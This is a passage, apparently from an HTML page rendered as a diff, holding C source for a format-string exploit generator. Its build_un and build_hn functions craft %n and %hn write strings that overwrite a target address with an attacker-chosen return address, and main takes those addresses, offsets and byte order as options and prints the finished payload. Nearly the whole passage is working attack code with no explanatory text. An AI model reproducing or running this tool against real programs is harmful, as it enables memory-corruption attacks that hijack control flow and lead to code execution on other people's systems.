+<br>&nbsp;
+<br>&nbsp; fprintf(stderr, "start=%d\n", start);
+<br>&nbsp;
+<p>&nbsp; OCT( b0, b1, b2, b3, retaddr );
+<br>&nbsp; if ( !(buf = (char *)malloc(length * sizeof(char))) ) {
+<br>&nbsp;&nbsp;&nbsp; fprintf( stderr, "Can't allocate buffer (%d)\n",
+length );
+<br>&nbsp;&nbsp;&nbsp; exit( -1 );
+<br>&nbsp; }
+<br>&nbsp; memset( buf, 0, length );
+<p>&nbsp; snprintf( buf, length,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3 - (sizeof( size_t ) * 4) + start - base, offset,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b2 - b3 + start, offset + 1,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b1 - b2 + start, offset + 2,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b0 - b1 + start, offset + 3 );
+<p>&nbsp; return buf;
+<br>}
+<p>char *
+<br>build_hn( unsigned int retaddr, unsigned int offset, unsigned int base
+)
+<br>{
+<br>&nbsp; unsigned int length;
+<br>&nbsp; unsigned int high, low;
+<br>&nbsp; char * buf;
+<br>&nbsp; int start = ((base / (ADD*ADD)) + 1)*ADD*ADD;
+<p>&nbsp; high = ( retaddr &amp; 0xffff0000 ) >> 16;
+<br>&nbsp; low = retaddr &amp; 0x0000ffff;
+<p>&nbsp; /* Certainement a recalculer&nbsp; ou egale a 128*/
+<br>&nbsp; length = ( sizeof( offset ) * 2 ) + sizeof( high ) + sizeof(
+low ) + 15;
+<br>&nbsp; if ( !(buf = (char *)malloc(length * sizeof(char))) ) {
+<br>&nbsp;&nbsp;&nbsp; fprintf( stderr, "Can't allocate buffer (%d)\n",
+length );
+<br>&nbsp;&nbsp;&nbsp; exit( -1 );
+<br>&nbsp; }
+<br>&nbsp; memset( buf, 0, length );
+<p>&nbsp; snprintf( buf, length,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%%.%hdx%%%d$n%%.%hdx%%%d$hn",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+low - ( sizeof( size_t ) * 2 ) + start - base,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+offset,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+high - low + start,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+offset+1 );
+<br>&nbsp; return buf;
+<br>}
+<p>int
+<br>main( int argc, char * argv[] )
+<br>{
+<br>&nbsp;
+<br>&nbsp; char opt;
+<br>&nbsp; char * fmt;
+<br>&nbsp; char * endian; /* la partie de la chaine contenant les adresses
+&agrave; &eacute;craser */
+<br>&nbsp; unsigned long locaddr, retaddr;
+<br>&nbsp; unsigned int offset, base, align = 0;
+<br>&nbsp; unsigned char b0, b1, b2, b3;
+<br>&nbsp; int length, ch;
+<br>&nbsp;
+<br>&nbsp; if ( argc != 10 ) {
+<br>&nbsp;&nbsp;&nbsp; usage( argv[0] );
+<br>&nbsp;&nbsp;&nbsp; exit( -1 );
+<br>&nbsp; }
+<p>&nbsp; length = ( sizeof( size_t ) * 16 ) + 1;
+<p>&nbsp; if ( !(endian = (char *)malloc(length * sizeof(char))) ) {
+<br>&nbsp;&nbsp;&nbsp; fprintf( stderr, "Can't allocate buffer (%d)\n",
+length );
+<br>&nbsp;&nbsp;&nbsp; exit( -1 );
+<br>&nbsp; }
+<br>&nbsp; memset( endian, 0, length );
+<p>&nbsp; while ( (opt = getopt( argc, argv, "nha:r:o:b:" )) != EOF )
+<br>&nbsp;&nbsp;&nbsp; switch( opt )
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'n':
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ch = 0;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'h':
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ch = 1;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'a':
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; locaddr = strtoul(
+optarg, NULL, 16 );
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'r':
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; retaddr = strtoul(
+optarg, NULL, 16 );
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'o':
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; offset = atoi(
+optarg );
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'b':
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; base = atoi(
+optarg );
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default:
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usage(argv[0]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit( -1 );
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
+<p>&nbsp; OCT( b0, b1, b2, b3, locaddr );
+<p>&nbsp; if ( base%4 ) {
+<br>&nbsp;&nbsp;&nbsp; align = 4 - ( base%4 );
+<br>&nbsp;&nbsp;&nbsp; base += align;
+<br>&nbsp; }
+<p>&nbsp; if ( ch == 0 ) {
+<br>&nbsp;&nbsp;&nbsp; snprintf( endian, length,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%c%c%c%c"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%c%c%c%c"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%c%c%c%c"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%c%c%c%c",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3, b2, b1, b0,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3 + 1, b2, b1, b0,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3 + 2, b2, b1, b0,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3 + 3, b2, b1, b0 );
+<br>&nbsp;&nbsp;&nbsp; fmt = build_un( retaddr, offset, base );
+<br>&nbsp; }
+<br>&nbsp; else {
+<br>&nbsp;&nbsp;&nbsp; snprintf( endian, length,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%c%c%c%c"
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"%c%c%c%c",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3, b2, b1, b0,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3 + 2, b2, b1, b0 );
+<p>&nbsp;&nbsp;&nbsp; fmt = build_hn( retaddr, offset, base );
+<br>&nbsp; }
+<br>&nbsp;
+<p>&nbsp; fprintf(stderr, "align=%d\n", align);
+<br>&nbsp; fprintf( stderr, "str=[%s%s] (%d)", endian, fmt, strlen(endian)+strlen(fmt)
+<br>);
+<br>&nbsp; for( ; align>0; --align)
+<br>&nbsp;&nbsp;&nbsp; printf("X");
+<br>&nbsp; printf( "%s%s", endian, fmt );
+<br>&nbsp; fprintf(stderr, "\n");
+<br>&nbsp; return( 0 );
+<br>}
+</body>
+</html>
